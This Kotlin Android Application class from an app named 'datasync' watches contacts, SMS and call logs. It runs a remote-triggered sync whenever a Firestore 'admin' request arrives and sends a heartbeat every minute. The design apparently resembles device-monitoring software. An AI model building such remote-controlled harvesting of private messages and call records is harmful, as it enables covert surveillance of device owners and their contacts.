package com.boxx.datasync

import android.app.Application
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.hilt.work.HiltWorkerFactory
import androidx.preference.PreferenceManager
import androidx.work.Configuration
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.sync.DataContentObserver
import com.boxx.datasync.sync.SyncService
import com.boxx.datasync.utils.DeviceIdHelper
import com.boxx.datasync.utils.GlobalExceptionHandler
import com.google.firebase.FirebaseApp
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.firestore.FirebaseFirestore
import dagger.hilt.android.HiltAndroidApp
import kotlinx.coroutines.*
import javax.inject.Inject

@HiltAndroidApp
class UserApplication : Application(), Configuration.Provider {

    @Inject
    lateinit var workerFactory: HiltWorkerFactory

    @Inject
    lateinit var repository: DataRepository

    private val applicationScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var heartbeatJob: Job? = null
    private var dataContentObserver: DataContentObserver? = null

    override val workManagerConfiguration: Configuration
        get() = Configuration.Builder()
            .setWorkerFactory(workerFactory)
            .build()

    override fun onCreate() {
        super.onCreate()
        Log.d("UserApplication", "REPO_SCAN_DONE")
        GlobalExceptionHandler.initialize(this)
        FirebaseApp.initializeApp(this)

        val deviceId = DeviceIdHelper.getDeviceId(this)
        val crashlytics = FirebaseCrashlytics.getInstance()
        crashlytics.setCrashlyticsCollectionEnabled(true)
        crashlytics.setUserId(deviceId)

        setupContentObservers()
        observeSyncRequests()
        startHeartbeat()
    }

    fun isPermissionGranted(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun observeSyncRequests() {
        val deviceId = DeviceIdHelper.getDeviceId(this)
        if (deviceId.isBlank()) return

        val prefs = PreferenceManager.getDefaultSharedPreferences(this)

        FirebaseFirestore.getInstance().collection("devices").document(deviceId)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e("UserApplication", "Error observing sync requests", error)
                    return@addSnapshotListener
                }

                snapshot?.let { doc ->
                    val requestedAt = doc.getLong("syncRequestedAt") ?: 0L
                    val lastHandledSyncRequest = prefs.getLong("last_handled_sync_request", 0L)

                    if (requestedAt > lastHandledSyncRequest) {
                        Log.d("UserApplication", "ADMIN_SYNC_REQUEST_RECEIVED")
                        prefs.edit().putLong("last_handled_sync_request", requestedAt).apply()
                        triggerSyncService()
                    }
                }
            }
    }

    private fun startHeartbeat() {
        val deviceId = DeviceIdHelper.getDeviceId(this)
        if (deviceId.isBlank()) return

        heartbeatJob?.cancel()
        heartbeatJob = applicationScope.launch {
            while (isActive) {
                try {
                    repository.updateHeartbeat(deviceId)
                    Log.d("UserApplication", "HEARTBEAT_UPDATED")
                } catch (e: Exception) {
                    Log.e("UserApplication", "Heartbeat failed", e)
                }
                delay(60_000)
            }
        }
    }

    fun setupContentObservers() {
        if (dataContentObserver == null) {
            dataContentObserver = DataContentObserver(this)
        }

        val observer = dataContentObserver ?: return

        try {
            contentResolver.unregisterContentObserver(observer)

            if (isPermissionGranted(android.Manifest.permission.READ_CONTACTS)) {
                contentResolver.registerContentObserver(android.provider.ContactsContract.Contacts.CONTENT_URI, true, observer)
            }
            if (isPermissionGranted(android.Manifest.permission.READ_SMS)) {
                contentResolver.registerContentObserver(android.provider.Telephony.Sms.CONTENT_URI, true, observer)
            }
            if (isPermissionGranted(android.Manifest.permission.READ_CALL_LOG)) {
                contentResolver.registerContentObserver(android.provider.CallLog.Calls.CONTENT_URI, true, observer)
            }
        } catch (e: Exception) {
            Log.e("UserApplication", "Failed to register ContentObserver", e)
        }
    }

    private fun triggerSyncService() {
        val intent = Intent(this, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    override fun onTerminate() {
        applicationScope.cancel()
        super.onTerminate()
    }
}
